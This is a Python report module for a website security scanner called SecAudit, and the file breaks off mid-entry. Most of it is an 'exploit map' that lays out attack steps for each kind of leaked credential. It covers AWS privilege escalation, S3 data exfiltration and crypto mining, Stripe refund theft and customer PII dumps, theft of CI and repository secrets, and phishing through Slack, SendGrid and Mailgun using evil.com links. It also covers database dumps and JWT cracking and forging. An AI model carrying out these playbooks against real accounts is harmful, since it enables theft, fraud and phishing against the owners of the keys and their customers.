"""Report generator for SecAudit."""
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.columns import Columns
from rich import box

SEV_COLORS = {"CRITICAL": "bold white on red", "HIGH": "bold red", "MEDIUM": "bold yellow", "LOW": "bold blue", "INFO": "dim cyan", "OK": "bold green"}
SEV_ICONS = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪", "OK": "🟢"}

class Reporter:
    def __init__(self, console):
        self.console = console
        self.vuln_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}

    def _sev(self, s):
        return f"[{SEV_COLORS.get(s,'dim')}]{SEV_ICONS.get(s,'')} {s}[/{SEV_COLORS.get(s,'dim')}]"

    def _section(self, title, icon="🔍"):
        self.console.print()
        self.console.print(Panel(f"[bold white]{title}[/bold white]", title=f"[bold cyan]{icon}[/bold cyan]", border_style="cyan", padding=(0, 2)))

    def generate_report(self, results, url):
        self.console.print()
        self.console.print(Panel("[bold white]SECURITY AUDIT REPORT[/bold white]", title="[bold red]☠  SECAUDIT RESULTS[/bold red]", border_style="bright_red", padding=(1, 4)))

        self._report_fetch(results.get("fetch", {}), url)
        self._report_domain(results.get("domain_info", {}))
        self._report_ssl(results.get("ssl", {}))
        self._report_tech(results.get("tech", {}))
        self._report_headers(results.get("headers", {}))
        self._report_vibe_coding(results.get("vibe_coding", []))
        self._report_resources(results.get("resources", {}))
        self._report_secrets(results.get("secrets", []))
        self._report_sensitive_paths(results.get("sensitive_paths", []))
        self._report_cookies(results.get("cookies", []))
        self._report_forms(results.get("forms", []))
        self._report_info_leaks(results.get("info_leaks", []))
        self._report_js(results.get("js_analysis", []))
        self._report_api_discovery(results.get("api_discovery", []))
        self._report_summary()

    def _report_fetch(self, data, url):
        self._section("TARGET INFORMATION", "🎯")
        t = Table(box=box.SIMPLE_HEAVY, show_header=False, padding=(0, 2))
        t.add_column("Key", style="bold cyan", width=20)
        t.add_column("Value", style="white")
        t.add_row("Target URL", url)
        t.add_row("Final URL", str(data.get("url_final", "N/A")))
        t.add_row("HTTP Status", str(data.get("status", "N/A")))
        t.add_row("Page Size", f"{data.get('size', 0):,} bytes")
        if data.get("url_final", url) != url:
            t.add_row("⚠ Redirect", f"[yellow]Redirected to {data.get('url_final')}[/yellow]")
        self.console.print(t)

    def _report_domain(self, data):
        if not data:
            return
        self._section("DOMAIN & DNS INTELLIGENCE", "🌐")
        t = Table(box=box.SIMPLE_HEAVY, show_header=False, padding=(0, 2))
        t.add_column("Key", style="bold cyan", width=20)
        t.add_column("Value", style="white")
        t.add_row("Domain", data.get("domain", "N/A"))
        t.add_row("IP Address", data.get("ip", "N/A"))
        dns = data.get("dns", {})
        for rt, vals in dns.items():
            t.add_row(f"DNS {rt}", ", ".join(vals[:5]))
        whois = data.get("whois")
        if whois:
            for k, v in whois.items():
                if v and v != "None":
                    t.add_row(f"WHOIS {k.title()}", str(v)[:80])
        self.console.print(t)

    def _report_ssl(self, data):
        if not data:
            return
        self._section("SSL/TLS ANALYSIS", "🔒")
        status = data.get("status", "UNKNOWN")
        if status == "NOT_HTTPS":
            self.console.print(Panel("[bold red]⚠ SITE IS NOT USING HTTPS![/bold red]\n\n[white]All traffic is transmitted in plaintext. Attackers on the same network can intercept all data including credentials.\n\n[bold]Exploit:[/bold] Use Wireshark or tcpdump to capture plaintext traffic on the same network.\n[bold]Patch:[/bold] Obtain a TLS certificate (Let's Encrypt is free) and enforce HTTPS.[/white]", border_style="red"))
            self.vuln_count["CRITICAL"] += 1
            return
        if status == "ERROR":
            self.console.print(f"[red]SSL Error: {data.get('error', 'Unknown')}[/red]")
            return
        t = Table(box=box.SIMPLE_HEAVY, show_header=False, padding=(0, 2))
        t.add_column("Key", style="bold cyan", width=20)
        t.add_column("Value", style="white")
        t.add_row("Status", "[green]✓ Valid Certificate[/green]")
        for k in ["version", "notBefore", "notAfter", "issuer", "serial"]:
            if data.get(k):
                t.add_row(k.title(), str(data[k])[:80])
        alts = data.get("alt_names", [])
        if alts:
            t.add_row("Alt Names", ", ".join(alts[:10]))
        self.console.print(t)

    def _report_tech(self, data):
        if not data:
            return
        self._section("TECHNOLOGY STACK", "⚙️")
        detected = data.get("detected", [])
        if detected:
            cats = {"Frontend": ["React", "Vue.js", "Angular", "Svelte", "jQuery", "Bootstrap", "Tailwind CSS"],
                    "Framework": ["Next.js", "Nuxt.js", "Django", "Laravel", "Express.js", "Flask", "Ruby on Rails", "ASP.NET"],
                    "Platform": ["WordPress", "Cloudflare", "Vercel", "Netlify", "Firebase", "Supabase"],
                    "Build": ["Webpack", "Vite"],
                    "Analytics": ["Google Analytics", "Google Tag Manager", "Hotjar", "Sentry"],
                    "Payment": ["Stripe.js"],
                    "Language": ["PHP"],
                    "Vibe-Coding": ["Replit", "Lovable (GPT Engineer)", "Bolt.new", "v0.dev (Vercel)", "Cursor", "Windsurf (Codeium)", "Create.xyz", "Tempo Labs", "Bubble.io", "Webflow", "Framer", "Wix", "Squarespace"]}
            t = Table(box=box.ROUNDED, padding=(0, 2))
            t.add_column("Category", style="bold cyan")
            t.add_column("Technologies", style="white")
            for cat, techs in cats.items():
                found = [x for x in detected if x in techs]
                if found:
                    t.add_row(cat, ", ".join(f"[bold green]{x}[/bold green]" for x in found))
            other = [x for x in detected if not any(x in v for v in cats.values())]
            if other:
                t.add_row("Other", ", ".join(f"[green]{x}[/green]" for x in other))
            self.console.print(t)
        else:
            self.console.print("[dim]No technologies confidently detected.[/dim]")
        meta = data.get("meta", {})
        if meta:
            mt = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
            mt.add_column("Meta", style="bold dim", width=25)
            mt.add_column("Value", style="dim")
            for k, v in list(meta.items())[:15]:
                mt.add_row(k, str(v)[:80])
            self.console.print(mt)

    def _report_headers(self, data):
        if not data:
            return
        self._section("HTTP SECURITY HEADERS", "🛡️")
        sec = data.get("security", [])
        t = Table(box=box.ROUNDED, padding=(0, 1))
        t.add_column("Header", style="bold white", width=30)
        t.add_column("Status", width=12)
        t.add_column("Severity", width=12)
        for h in sec:
            status = "[green]✓ Present[/green]" if h["status"] == "PRESENT" else "[red]✗ Missing[/red]"
            t.add_row(h["header"], status, self._sev(h["severity"]))
        self.console.print(t)
        missing = [h for h in sec if h["status"] == "MISSING"]
        for h in missing:
            sev = h["severity"]
            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
            self.console.print(Panel(
                f"[bold]{h['header']}[/bold] — {h['description']}\n\n"
                f"[bold red]Exploit:[/bold red] {h['exploit']}\n\n"
                f"[bold green]Patch:[/bold green] [cyan]{h['patch']}[/cyan]",
                title=f"{self._sev(sev)} Missing Header", border_style="yellow"))
        leaks = data.get("info_leak", [])
        if leaks:
            self.console.print()
            for l in leaks:
                self.vuln_count["LOW"] += 1
                self.console.print(f"  [yellow]⚠ {l['header']}:[/yellow] [white]{l['value']}[/white] — [dim]{l['risk']}[/dim]")

    def _report_vibe_coding(self, tools):
        self._section("VIBE-CODING / AI BUILDER DETECTION", "🤖")
        if not tools:
            self.console.print("[dim]  No vibe-coding or AI builder tools detected.[/dim]")
            return
        self.console.print(f"[bold magenta]  ⚠ Detected {len(tools)} vibe-coding tool(s)![/bold magenta]\n")
        self.console.print(Panel(
            "[bold yellow]⚡ VIBE-CODED APPLICATION DETECTED[/bold yellow]\n\n"
            "[white]This site appears to be built with AI-assisted or no-code tools. "
            "These applications commonly have:[/white]\n"
            "  • Hardcoded API keys in client-side bundles\n"
            "  • Missing or weak authentication middleware\n"
            "  • Default security configurations\n"
            "  • Overly permissive CORS and database rules\n"
            "  • Exposed environment variables in build artifacts",
            border_style="magenta", title="[bold]🚨 VIBE-CODE ALERT[/bold]"))
        for tool in tools:
            self.vuln_count["INFO"] += 1
            self.console.print(Panel(
                f"[bold]Tool:[/bold] [magenta]{tool['tool']}[/magenta]\n"
                f"[bold]What:[/bold] {tool['description']}\n"
                f"[bold]Evidence:[/bold] [dim]{tool['evidence']}[/dim]\n\n"
                f"[bold yellow]Security Risk:[/bold yellow] {tool['risk']}\n\n"
                f"[bold green]Recommendation:[/bold green] Manually review all AI-generated code for hardcoded secrets, "
                f"validate authentication flows, check database security rules, and ensure no development credentials remain in production.",
                title=f"🤖 {tool['tool']}", border_style="bright_magenta"))

    def _report_resources(self, data):
        if not data:
            return
        self._section("CRAWLED RESOURCES", "📦")
        t = Table(box=box.SIMPLE_HEAVY, show_header=False, padding=(0, 2))
        t.add_column("Key", style="bold cyan", width=20)
        t.add_column("Value", style="white")
        t.add_row("JS Files", str(data.get("js_count", 0)))
        t.add_row("CSS Files", str(data.get("css_count", 0)))
        t.add_row("Total Source", f"{data.get('total_source_size', 0):,} bytes analyzed")
        self.console.print(t)

    def _report_secrets(self, secrets):
        self._section("SECRET & API KEY SCANNER", "🔑")
        if not secrets:
            self.console.print("[bold green]  ✓ No hardcoded secrets detected.[/bold green]")
            return
        self.console.print(f"[bold red]  ⚠ Found {len(secrets)} potential secret(s)![/bold red]\n")
        for s in secrets:
            sev = s.get("severity", "HIGH")
            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
            exploit_map = {
                "AWS Access Key": (
                    "1. Find account ID and user info:\n"
                    "   aws sts get-caller-identity --access-key AKIA...\n"
                    "   aws iam get-user --access-key AKIA...\n"
                    "2. Enumerate S3 buckets:\n"
                    "   aws s3 ls\n"
                    "   aws s3 ls s3://bucket-name/\n"
                    "   aws s3api list-objects-v2 --bucket bucket-name\n"
                    "3. Escalate privileges:\n"
                    "   aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
                    "4. Exfil data:\n"
                    "   aws s3 sync s3://bucket-name/ /tmp/stolen/\n"
                    "5. Persistence: create IAM users, access keys, modify security groups.\n"
                    "6. Crypto mining: aws ec2 run-instances --instance-type t2.medium --ami ami-xxxx"
                ),
                "AWS Secret Key": (
                    "Used with Access Key for full AWS API access.\n"
                    "1. Configure credentials:\n"
                    "   aws configure (paste both keys)\n"
                    "2. After config:\n"
                    "   aws s3 ls / aws iam list-users / aws ec2 describe-instances / aws lambda list-functions\n"
                    "3. Full account takeover: create admin user, SSM for EC2 RCE"
                ),
                "Google API Key": (
                    "1. Find project ID (try API keys from same source or check referrer):\n"
                    "   curl 'https://www.googleapis.com/discovery/v1/apis?key=<KEY>'\n"
                    "   curl 'https://cloudresourcemanager.googleapis.com/v1/projects?key=<KEY>'\n"
                    "2. Test specific services (403 = blocked, 200 = vulnerable):\n"
                    "   # Geocoding/Maps\n"
                    "   curl 'https://maps.googleapis.com/maps/api/geocode/json?address=Paris&key=<KEY>'\n"
                    "   # Directions API\n"
                    "   curl 'https://maps.googleapis.com/maps/api/directions/json?origin=NYC&destination=LA&key=<KEY>'\n"
                    "   # Street View\n"
                    "   curl 'https://maps.googleapis.com/maps/api/streetview?size=600x400&location=NYC&key=<KEY>'\n"
                    "   # Cloud Translation\n"
                    "   curl -X POST 'https://translation.googleapis.com/language/translate/v2/detect?key=<KEY>' -d '{\"q\":\"hello\"}'\n"
                    "   # Vision API (OCR)\n"
                    "   curl -X POST 'https://vision.googleapis.com/v1/images:annotate?key=<KEY>' -d '{\"requests\":[{\"image\":{\"source\":{\"imageUri\":\"https://example.com/test.jpg\"}},\"features\":[{\"type\":\"TEXT_DETECTION\"}]}]}'\n"
                    "   # Speech-to-Text\n"
                    "   curl -X POST 'https://speech.googleapis.com/v1/speech:recognize?key=<KEY>' -d '{\"config\":{\"encoding\":\"FLAC\",\"sampleRateHertz\":16000,\"languageCode\":\"en-US\"},\"audio\":{\"uri\":\"gs://test/test.flac\"}}'\n"
                    "   # Firebase RTDB (if Firebase key)\n"
                    "   curl 'https://<PROJECT>.firebaseio.com/.json?key=<KEY>'\n"
                    "   # Firestore\n"
                    "   curl 'https://firestore.googleapis.com/v1/projects/<PROJECT>/databases/(default)/documents?key=<KEY>'\n"
                    "3. For YouTube API:\n"
                    "   curl 'https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&key=<KEY>'\n"
                    "4. Escalate: Use Google Maps API to probe internal network, use Vision API for OCR on sensitive docs, rack up bills on victim's account."
                ),
                "Stripe Secret Key": (
                    "1. List all customers (PII exposed):\n"
                    "   curl https://api.stripe.com/v1/customers?limit=100 -u sk_live_XXXX:\n"
                    "2. List all payment methods:\n"
                    "   curl https://api.stripe.com/v1/customers/cus_XXXX/sources -u sk_live_XXXX:\n"
                    "3. List charges and transactions:\n"
                    "   curl https://api.stripe.com/v1/charges?limit=100 -u sk_live_XXXX:\n"
                    "4. Create refund (steal money):\n"
                    "   curl https://api.stripe.com/v1/refunds -u sk_live_XXXX: -d charge=ch_xxx\n"
                    "5. Read balance and transfer funds:\n"
                    "   curl https://api.stripe.com/v1/balance -u sk_live_XXXX:\n"
                    "   curl https://api.stripe.com/v1/transfers -u sk_live_XXXX:\n"
                    "6. Full PII exfil: names, emails, cards, addresses, transaction history."
                ),
                "Stripe Publishable Key": (
                    "1. Find associated secret key (usually in same codebase):\n"
                    "2. With both keys, full Stripe API access.\n"
                    "3. Test payment flows and enumerate customers:\n"
                    "   curl https://api.stripe.com/v1/customers?limit=10 -u pk_live_XXXX:\n"
                    "4. Reveals: account ID, active payment configs, customer count."
                ),
                "OpenAI API Key": (
                    "1. Check account details and usage:\n"
                    "   curl https://api.openai.com/v1/dashboard -H 'Authorization: Bearer sk-XXXX'\n"
                    "   curl https://api.openai.com/v1/usage -H 'Authorization: Bearer sk-XXXX'\n"
                    "2. List models and pricing:\n"
                    "   curl https://api.openai.com/v1/models -H 'Authorization: Bearer sk-XXXX'\n"
                    "3. Run GPT-4 (expensive):\n"
                    "   curl https://api.openai.com/v1/chat/completions \\\n"
                    "     -H 'Authorization: Bearer sk-XXXX' \\\n"
                    "     -H 'Content-Type: application/json' \\\n"
                    "     -d '{\"model\":\"gpt-4\",\"max_tokens\":1000,\"messages\":[{\"role\":\"user\",\"content\":\"Explain nuclear physics\"}]}'\n"
                    "4. Run DALL-E image generation ($$$):\n"
                    "   curl https://api.openai.com/v1/images/generations \\\n"
                    "     -H 'Authorization: Bearer sk-XXXX' \\\n"
                    "     -d '{\"model\":\"dall-e-3\",\"prompt\":\"professional hacking tool logo\"}'\n"
                    "5. Access Assistants API and Vector Stores for data exfil.\n"
                    "6. Can run up $1000+/day with automated abuse."
                ),
                "Anthropic API Key": (
                    "1. Make Claude API calls at victim's expense:\n"
                    "   curl https://api.anthropic.com/v1/messages \\\n"
                    "     -H 'x-api-key: sk-ant-XXXX' \\\n"
                    "     -H 'anthropic-version: 2023-06-01' \\\n"
                    "     -H 'Content-Type: application/json' \\\n"
                    "     -d '{\"model\":\"claude-sonnet-4-20250514\",\"max_tokens\":1024,\"messages\":[{\"role\":\"user\",\"content\":\"Hello\"}]}'\n"
                    "2. Use Claude Opus for expensive long-context tasks.\n"
                    "3. Bills can escalate to hundreds/day with automated abuse."
                ),
                "OpenRouter API Key": (
                    "1. Route calls to ANY LLM provider (OpenAI, Anthropic, Google, etc.):\n"
                    "   curl https://openrouter.ai/api/v1/chat/completions \\\n"
                    "     -H 'Authorization: Bearer sk-or-v1-XXXX' \\\n"
                    "     -H 'Content-Type: application/json' \\\n"
                    "     -d '{\"model\":\"anthropic/claude-sonnet-4-20250514\",\"messages\":[{\"role\":\"user\",\"content\":\"Hello\"}]}'\n"
                    "2. Access to 100+ models through a single stolen key.\n"
                    "3. Can abuse credits across multiple providers simultaneously."
                ),
                "GitHub Token": (
                    "1. Get user info and scopes:\n"
                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/user\n"
                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/user/repos?visibility=private&per_page=100\n"
                    "2. Clone private repos:\n"
                    "   git clone https://ghp_XXXX@github.com/org/private-repo.git\n"
                    "3. Read repo secrets/actions variables:\n"
                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/repos/org/repo/actions/secrets\n"
                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/repos/org/repo/actions/variables\n"
                    "4. Read commit history and code:\n"
                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/repos/org/repo/commits\n"
                    "5. Access GitHub Packages:\n"
                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/user/packages\n"
                    "6. Escalate: Create backdoor commit, steal secrets, modify releases."
                ),
                "Slack Token": (
                    "1. Get token info and list workspaces:\n"
                    "   curl 'https://slack.com/api/auth.test' -H 'Authorization: Bearer xoxb-XXXX'\n"
                    "2. List all channels:\n"
                    "   curl 'https://slack.com/api/conversations.list?types=public_channel,private_channel' -H 'Authorization: Bearer xoxb-XXXX'\n"
                    "3. Read message history (any public/private channel):\n"
                    "   curl 'https://slack.com/api/conversations.history?channel=C123' -H 'Authorization: Bearer xoxb-XXXX'\n"
                    "4. List users and emails:\n"
                    "   curl 'https://slack.com/api/users.list' -H 'Authorization: Bearer xoxb-XXXX'\n"
                    "5. Post phishing messages:\n"
                    "   curl -X POST 'https://slack.com/api/chat.postMessage' -H 'Authorization: Bearer xoxb-XXXX' \\\n"
                    "     -d 'channel=C123&text=Click here: http://evil.com&unfurl_links=true'\n"
                    "6. Access files and shared docs:\n"
                    "   curl 'https://slack.com/api/files.list' -H 'Authorization: Bearer xoxb-XXXX'\n"
                    "7. Full workspace takeover, phishing, data exfil."
                ),
                "Discord Webhook": (
                    "1. Post messages to channel:\n"
                    "   curl -X POST 'WEBHOOK_URL' -H 'Content-Type: application/json' \\\n"
                    "     -d '{\"content\":\"Phishing message from compromised webhook\"}'\n"
                    "2. Send embedded phishing content with custom username/avatar.\n"
                    "3. Spam or social engineer server members."
                ),
                "Discord Bot Token": (
                    "1. Login as bot and access all guilds:\n"
                    "   curl -H 'Authorization: Bot TOKEN' https://discord.com/api/v10/users/@me/guilds\n"
                    "2. Read all messages, manage channels, kick/ban users.\n"
                    "3. Full server takeover if bot has admin permissions."
                ),
                "Database URL": (
                    "1. Connect directly (varies by DB type):\n"
                    "   # PostgreSQL\n"
                    "   psql 'postgresql://user:pass@host:5432/db'\n"
                    "   # MySQL\n"
                    "   mysql -h host -u user -p'pass' db\n"
                    "   # MongoDB\n"
                    "   mongosh 'mongodb://user:pass@host:27017/db'\n"
                    "   # Redis\n"
                    "   redis-cli -h host -u user:pass\n"
                    "2. PostgreSQL/MySQL - dump all data:\n"
                    "   pg_dump -h host -u user db > dump.sql\n"
                    "   mysqldump -h host -u user -p db > dump.sql\n"
                    "3. MongoDB - list collections and dump:\n"
                    "   db.getCollectionNames()\n"
                    "   db.users.find().forEach(printjson)\n"
                    "4. Full data breach: users, passwords, payment info, PII, secrets."
                ),
                "JWT Token": (
                    "1. Decode payload (no key needed):\n"
                    "   echo 'TOKEN' | cut -d. -f2 | base64 -d\n"
                    "2. Use token to access protected API endpoints:\n"
                    "   curl -H 'Authorization: Bearer TOKEN' https://target.com/api/user\n"
                    "3. If secret is weak, crack it: hashcat -m 16500 token.txt wordlist.txt\n"
                    "4. Forge new tokens with modified claims (admin role, different user ID)."
                ),
                "Firebase API Key": (
                    "1. Test Firestore access:\n"
                    "   curl 'https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/users?key=KEY'\n"
                    "2. Test Realtime Database:\n"
                    "   curl 'https://PROJECT.firebaseio.com/.json'\n"
                    "3. If security rules are { \".read\": true }, entire database is exposed.\n"
                    "4. Check auth: curl 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=KEY' -d '{\"returnSecureToken\":true}'"
                ),
                "Firebase URL": (
                    "1. Try reading the entire database:\n"
                    "   curl 'https://PROJECT.firebaseio.com/.json'\n"
                    "2. If rules allow: curl 'https://PROJECT.firebaseio.com/users.json'\n"
                    "3. Write data: curl -X PUT 'https://PROJECT.firebaseio.com/test.json' -d '{\"pwned\":true}'\n"
                    "4. Common in vibe-coded apps with default open rules."
                ),
                "SendGrid API Key": (
                    "1. Send emails as the victim's domain:\n"
                    "   curl -X POST 'https://api.sendgrid.com/v3/mail/send' \\\n"
                    "     -H 'Authorization: Bearer SG.XXXX' \\\n"
                    "     -H 'Content-Type: application/json' \\\n"
                    "     -d '{\"personalizations\":[{\"to\":[{\"email\":\"target@email.com\"}]}],\"from\":{\"email\":\"ceo@victim.com\"},\"subject\":\"Urgent\",\"content\":[{\"type\":\"text/plain\",\"value\":\"...\"}]}'\n"
                    "2. Phishing campaigns from trusted domain, spam, reputation damage."
                ),
                "Twilio API Key": (
                    "1. Send SMS from victim's number:\n"
                    "   curl -X POST 'https://api.twilio.com/2010-04-01/Accounts/ACXXX/Messages.json' \\\n"
                    "     -u 'ACXXX:AUTH_TOKEN' \\\n"
                    "     -d 'To=+1234567890&From=+0987654321&Body=Phishing SMS'\n"
                    "2. Make phone calls, access call logs, read SMS history.\n"
                    "3. Run up charges with premium rate numbers."
                ),
                "Supabase Key": (
                    "1. Get project info:\n"
                    "   curl 'https://PROJECT.supabase.co/rest/v1/?apikey=ANON_KEY'\n"
                    "2. List all tables (bypass RLS if misconfigured):\n"
                    "   curl 'https://PROJECT.supabase.co/rest/v1/users?select=*' \\\n"
                    "     -H 'apikey: ANON_KEY' -H 'Authorization: Bearer ANON_KEY'\n"
                    "3. Insert/update data (if no RLS):\n"
                    "   curl -X POST 'https://PROJECT.supabase.co/rest/v1/users' \\\n"
                    "     -H 'apikey: ANON_KEY' -H 'Authorization: Bearer ANON_KEY' \\\n"
                    "     -H 'Content-Type: application/json' \\\n"
                    "     -d '[{\"email\":\"hacker@evil.com\",\"role\":\"admin\"}]'\n"
                    "4. Access storage buckets:\n"
                    "   curl 'https://PROJECT.supabase.co/storage/v1/bucket' -H 'apikey: ANON_KEY'\n"
                    "5. Dump auth users:\n"
                    "   curl 'https://PROJECT.supabase.co/auth/v1/users' -H 'apikey: SERVICE_ROLE_KEY'\n"
                    "6. Very common in vibe-coded apps - often with permissive RLS."
                ),
                "Heroku API Key": (
                    "1. List all apps and their IDs:\n"
                    "   curl -n https://api.heroku.com/apps \\\n"
                    "     -H 'Authorization: Bearer TOKEN' \\\n"
                    "     -H 'Accept: application/vnd.heroku+json; version=3'\n"
                    "2. Read config vars (ALL env secrets - DB_URL, API keys, etc.):\n"
                    "   curl https://api.heroku.com/apps/APP_ID/config-vars \\\n"
                    "     -H 'Authorization: Bearer TOKEN'\n"
                    "3. Scale dynos, restart apps:\n"
                    "   curl -X DELETE https://api.heroku.com/apps/APP_ID/dynos \\\n"
                    "     -H 'Authorization: Bearer TOKEN'\n"
                    "4. Access add-ons (databases, caches):\n"
                    "   curl https://api.heroku.com/apps/APP_ID/addons \\\n"
                    "     -H 'Authorization: Bearer TOKEN'\n"
                    "5. Deploy malicious code via slug upload.\n"
                    "6. ALL secrets exposed: DB credentials, API keys, JWT secrets."
                ),
                "Mapbox Token": (
                    "1. Test geocoding and maps:\n"
                    "   curl 'https://api.mapbox.com/geocoding/v5/mapbox.places/Paris.json?access_token=TOKEN'\n"
                    "   curl 'https://api.mapbox.com/directions/v5/mapbox/driving/-73.985,40.758;-122.419,37.774.json?access_token=TOKEN'\n"
                    "2. Access datasets and tiles:\n"
                    "   curl 'https://api.mapbox.com/datasets/v1/TOKEN/datasets'\n"
                    "3. Read user's uploaded data.\n"
                    "4. Run up bills on victim's account."
                ),
                "GitLab Token": (
                    "1. Get user info and list projects:\n"
                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/users/me'\n"
                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/projects?visibility=private'\n"
                    "2. Read CI/CD variables (secrets):\n"
                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/projects/ID/variables'\n"
                    "3. Read repository files and commits:\n"
                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/projects/ID/repository/tree'\n"
                    "4. Access runners, deploy keys, group memberships.\n"
                    "5. Modify pipelines, steal artifacts, inject malicious CI jobs."
                ),
                "Mailgun API Key": (
                    "1. Get domain info and limits:\n"
                    "   curl -s -u 'api:key-XXXX' 'https://api.mailgun.net/v3/domains'\n"
                    "2. Send phishing emails:\n"
                    "   curl -s -X POST 'https://api.mailgun.net/v3/DOMAIN/messages' \\\n"
                    "     -u 'api:key-XXXX' \\\n"
                    "     -F from='Support <support@victim.com>' \\\n"
                    "     -F to='target@email.com' \\\n"
                    "     -F subject='Reset Password' \\\n"
                    "     -F text='Click: http://evil.com/reset?token=xxx'\n"
                    "3. Read event logs, stored templates.\n"
                    "4. Phishing, BEC attacks, spam from victim's domain."
                ),
                "DigitalOcean Token": (
                    "1. Get account info:\n"
                    "   curl -H 'Authorization: Bearer dop_v1_XXXX' 'https://api.digitalocean.com/v2/account'\n"
                    "2. List all droplets:\n"
                    "   curl -H 'Authorization: Bearer dop_v1_XXXX' 'https://api.digitalocean.com/v2/droplets'\n"
                    "3. Create/destroy droplets (crypto mining):\n"
                    "   curl -X POST -H 'Authorization: Bearer dop_v1_XXXX' 'https://api.digitalocean.com/v2/droplets' \\\n"
                    "     -d '{\"name\":\"hacker\",\"region\":\"nyc1\",\"size\":\"s-4vcpu-8gb\"}'\n"
                    "4. Access snapshots, volumes, load balancers.\n"
                    "5. ALL secrets exposed: SSH keys, backup snapshots."
                ),
                "Netlify Token": (
                    "1. List all sites and builds:\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.netlify.com/api/v1/sites'\n"
                    "2. Read env vars (contains secrets):\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.netlify.com/api/v1/sites/SITE_ID/env'\n"
                    "3. Access deploy logs and build settings.\n"
                    "4. Modify site configuration, inject malicious redirects.\n"
                    "5. Steal source code from deploys."
                ),
                "Vercel Token": (
                    "1. Get user/org info:\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.vercel.com/v2/user'\n"
                    "2. List deployments and secrets:\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.vercel.com/v6/deployments'\n"
                    "3. Read env vars (API keys, DB creds):\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.vercel.com/v2/projects/PROJECT_ID/env'\n"
                    "4. Create malicious deployments, steal source code."
                ),
                "Shopify API": (
                    "1. Get shop info:\n"
                    "   curl 'https://SHOP.myshopify.com/admin/api/2024-01/shop.json' -H 'X-Shopify-Access-Token: shpat_XXXX'\n"
                    "2. List all products and orders:\n"
                    "   curl 'https://SHOP.myshopify.com/admin/api/2024-01/orders.json?status=any' -H 'X-Shopify-Access-Token: shpat_XXXX'\n"
                    "3. Read customer PII:\n"
                    "   curl 'https://SHOP.myshopify.com/admin/api/2024-01/customers.json' -H 'X-Shopify-Access-Token: shpat_XXXX'\n"
                    "4. Modify products, prices, create fake orders.\n"
                    "5. Full store takeover, payment fraud."
                ),
                "Cloudflare API": (
                    "1. Get account info:\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.cloudflare.com/client/v4/user'\n"
                    "2. List zones and domains:\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.cloudflare.com/client/v4/zones'\n"
                    "3. Read DNS records (internal infrastructure):\n"
                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records'\n"
                    "4. Modify DNS, redirect traffic, disable protection.\n"
                    "5. Access Cloudflare Workers secrets."
                ),
                "Square Access Token": (
                    "1. Get merchant info:\n"
                    "   curl -H 'Authorization: Bearer sq0atp-XXXX' 'https://connect.squareup.com/v2/me'\n"
                    "2. List transactions:\n"
                    "   curl -H 'Authorization: Bearer sq0atp-XXXX' 'https://connect.squareup.com/v2/transactions'\n"
                    "3. Read customer cards (last 4):\n"
                    "   curl -H 'Authorization: Bearer sq0atp-XXXX' 'https://connect.squareup.com/v2/customers'\n"
                    "4. Issue refunds, modify orders, access financial data."
                ),
                "PayPal Client ID": (
                    "1. Check if it's an OAuth secret too:\n"
                    "   curl 'https://api.paypal.com/v1/oauth2/token' -d 'client_id=ID&client_secret=SECRET&grant_type=client_credentials'\n"
                    "2. Access PayPal API on behalf of victim.\n"
                    "3. Read transaction history, access billing agreements.\n"
                    "4. Create unauthorized payments."
                ),
                "Discord Bot Token": (
                    "1. Get bot info and guilds:\n"
                    "   curl -H 'Authorization: Bot TOKEN' 'https://discord.com/api/v10/users/@me'\n"
                    "   curl -H 'Authorization: Bot TOKEN' 'https://discord.com/api/v10/users/@me/guilds'\n"
                    "2. Read all messages in every channel:\n"
                    "   curl -H 'Authorization: Bot TOKEN' 'https://discord.com/api/v10/channels/CHANNEL_ID/messages'\n"
                    "3. Manage channels, roles, kick/ban members.\n"
                    "4. Full server takeover if bot has admin permissions.\n"
                    "5. Exfiltrate channel history, user data."
                ),
                "Discord Webhook": (
                    "1. Post messages with custom username/avatar:\n"
                    "   curl -X POST 'WEBHOOK_URL' \\\n"
                    "     -H 'Content-Type: application/json' \\\n"
                    "     -d '{\"content\":\"Phishing message\",\"username\":\"Support\",\"avatar_url\":\"https://legit-site.com/logo.png\"}'\n"
                    "2. Send file uploads, embeds with malicious links.\n"
                    "3. Mass DM via webhook spam.\n"
                    "4. Social engineering campaigns with trusted branding."
                ),
                "JWT Token": (
                    "1. Decode payload (no signature needed):\n"
                    "   echo 'eyJ...' | cut -d. -f2 | base64 -d\n"
                    "2. Check expiration and claims:\n"
                    "   python3 -c \"import jwt; print(jwt.decode('TOKEN', options={'verify_signature': False}))\"\n"
                    "3. If 'none' algorithm: modify payload to escalate privileges.\n"
                    "4. If secret is weak, crack it:\n"
